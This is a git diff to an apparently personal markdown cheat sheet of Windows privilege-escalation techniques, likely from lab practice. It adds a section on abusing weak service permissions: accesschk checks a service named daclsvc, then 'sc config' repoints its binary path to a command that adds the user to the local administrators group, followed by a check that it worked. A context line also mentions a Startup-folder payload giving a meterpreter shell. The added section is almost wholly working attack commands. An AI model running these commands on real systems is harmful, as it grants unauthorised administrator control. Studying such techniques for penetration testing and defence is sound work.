@@ -9,6 +9,7 @@
 7. [Registry](#registry)
 8. [Executable Files](#executable-files)
 9. [Startup Applications](#startup-applications)
+10. [Service Permissions](#service-permissions)
 
 ## Kernel Exploits
 
@@ -401,4 +402,24 @@ move x.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 
 #logout and then login as administrator
 #we get a meterpreter shell now
+```
+
+## Service Permissions
+
+```shell
+#binary paths
+#in windows cmd
+C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc
+#user has SERVICE_CHANGE_CONFIG permission
+
+sc qc daclsvc
+
+sc config daclsvc binpath= "net localgroup administrators user /add"
+
+sc start daclsvc
+
+net localgroup administrators
+#it works and user has been added to the group
+
+#we can also exploit unquoted service paths, if any exist
 ```
